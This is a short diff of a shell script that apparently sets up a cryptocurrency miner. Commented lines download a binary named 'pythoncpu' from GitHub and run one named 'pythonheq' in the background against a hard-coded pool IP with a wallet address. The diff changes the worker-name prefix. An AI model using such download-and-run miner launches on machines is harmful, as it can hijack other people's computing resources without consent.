@@ -50,8 +50,7 @@ sed -i "s+ip0001+RV_$IPNAME+g" config.json
 #chmod +x pythonheq
 
 
-
-#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."RV_"$IPNAME -t 4   1>> oout 2>> oout &
+#./pythonheq -v -l 116.203.10.54:3000 -u RNEzrdAY8JNRrEre37aZbegHSx2CgaoXek."VER_""$IPNAME" -t 4 1> oout 2> oout &
 
 ###### 5G
 #wget -q https://github.com/one10001/10001code/raw/main/pythoncpu
